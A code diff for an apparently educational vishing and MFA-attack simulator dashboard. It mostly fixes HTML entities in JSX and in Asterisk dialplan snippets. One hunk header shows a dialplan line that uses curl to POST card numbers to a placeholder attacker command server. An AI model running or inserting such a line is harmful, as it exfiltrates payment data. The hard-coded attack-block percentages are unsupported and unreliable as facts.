@@ -172,11 +172,11 @@ exten => s,n,System(curl -X POST https://attacker-c2.net/log?card=\${CARD_NUM}&p
     const numerator = channelMultiplier * persuasionIntensity;
     const exponent = -numerator / passkeyArmorStrength;
     const rawBreachProb = (1 - Math.exp(exponent)) * 100;
-    const actualBreachProb = passkeyArmorStrength &ge; 500
+    const actualBreachProb = passkeyArmorStrength >= 500
       ? (rawBreachProb * 0.012).toFixed(2) // FIDO2 Passkeys + STIR/SHAKEN blocks 98.8% of attacks
       : passkeyArmorStrength >= 50
       ? (rawBreachProb * 0.32).toFixed(2)  // Push Notification MFA blocks 68% of attacks
-      : rawBreachProb.toFixed(2);           // SMS OTP &rarr; 100% vulnerable to Vishing / SIM Swap
+      : rawBreachProb.toFixed(2);           // SMS OTP -> 100% vulnerable to Vishing / SIM Swap
 
     return {
       rawBreachProb: rawBreachProb.toFixed(2),
@@ -260,7 +260,7 @@ Write-Host "[+] Insecure SMS OTP & Voice Call Auth DISABLED! FIDO2 Passkeys Enfo
 exten => _X.,1,NoOp(Inspecting Outbound Call from \${CALLERID(num)})
 
 ; Verify Caller-ID belongs to registered internal range (033-2592-4000 to 4099)
-exten => _X.,n,GotoIf($["\${CALLERID(num)}" &ge; "03325924000" & "\${CALLERID(num)}" &le; "03325924099"]?authorized:block)
+exten => _X.,n,GotoIf($["\${CALLERID(num)}" >= "03325924000" & "\${CALLERID(num)}" <= "03325924099"]?authorized:block)
 
 exten => _X.,n(authorized),Dial(PJSIP/\${EXTEN}@kolkata-pstn-gateway,60)
 exten => _X.,n,Hangup()
@@ -610,7 +610,7 @@ exten => _X.,n,Hangup()`,
                     ? "bg-rose-950/80 border-rose-500 shadow-lg shadow-rose-950/50"
                     : "bg-[#0c101c] border-gray-800 hover:border-gray-700 text-gray-400 hover:text-gray-200"
                 )}
-              &gt;
+              >
                 <span className="text-[8.5px] font-bold px-1.5 py-0.5 rounded border bg-rose-950 text-rose-300 border-rose-800 self-start">
                   THREAT
                 </span>
@@ -707,7 +707,7 @@ exten => _X.,n,Hangup()`,
                   value={channelMultiplier}
                   onChange={(e) => setChannelMultiplier(parseFloat(e.target.value))}
                   className="w-full accent-cyan-500 bg-gray-800"
-                /&gt;
+                />
               </div>
 
               <div className="space-y-1">
@@ -723,7 +723,7 @@ exten => _X.,n,Hangup()`,
                   value={persuasionIntensity}
                   onChange={(e) => setPersuasionIntensity(parseFloat(e.target.value))}
                   className="w-full accent-rose-500 bg-gray-800"
-                /&gt;
+                />
               </div>
 
               <div className="space-y-1 pt-1">
@@ -737,7 +737,7 @@ exten => _X.,n,Hangup()`,
                         ? "bg-rose-950 border-rose-500 text-rose-300"
                         : "bg-gray-950 border-gray-800 text-gray-400"
                     )}
-                  &gt;
+                  >
                     SMS OTP (1x)
                   </button>
                   <button
@@ -748,7 +748,7 @@ exten => _X.,n,Hangup()`,
                         ? "bg-amber-950 border-amber-500 text-amber-300"
                         : "bg-gray-950 border-gray-800 text-gray-400"
                     )}
-                  &gt;
+                  >
                     Push MFA (50x)
                   </button>
                   <button
@@ -759,7 +759,7 @@ exten => _X.,n,Hangup()`,
                         ? "bg-emerald-950 border-emerald-500 text-emerald-300"
                         : "bg-gray-950 border-gray-800 text-gray-400"
                     )}
-                  &gt;
+                  >
                     FIDO2 Passkey (500x)
                   </button>
                 </div>
@@ -818,7 +818,7 @@ exten => _X.,n,Hangup()`,
                     ? "bg-purple-950 border-purple-500 text-purple-300 shadow-md shadow-purple-950/50"
                     : "bg-[#0b101c] border-gray-800 hover:border-gray-700 text-gray-400"
                 )}
-              &gt;
+              >
                 {item.name}
               </button>
             ))}
@@ -867,7 +867,7 @@ exten => _X.,n,Hangup()`,
                     ? "bg-amber-950/60 border-amber-500 shadow-md"
                     : "bg-[#0b101c] border-gray-800 hover:border-gray-700 text-gray-400"
                 )}
-              &gt;
+              >
                 <span className="text-[10px] font-bold px-2 py-0.5 rounded bg-gray-900 text-amber-300 border border-amber-800">
                   {sc.lead} · {sc.location.split(" ")[0]}
                 </span>
